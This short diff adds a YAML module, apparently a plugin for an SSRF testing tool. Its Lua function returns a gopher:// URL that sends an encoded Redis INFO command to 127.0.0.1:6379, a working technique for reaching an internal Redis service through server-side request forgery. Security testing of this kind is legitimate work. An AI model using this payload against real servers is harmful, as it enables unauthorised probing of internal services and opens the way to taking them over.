@@ -1,0 +1,24 @@
+meta:
+  id: gopher_redis
+  version: 1
+  name: "Gopher Protocol Redis"
+  description: "Uses gopher:// to interact with Redis"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 70
+  confidence: 65
+  severity: high
+  tags: [gopher, redis, internal]
+  references: []
+match:
+  schemes: [http, https, gopher]
+  requires: [hostname]
+  supports: [gopher]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a" }
+    end
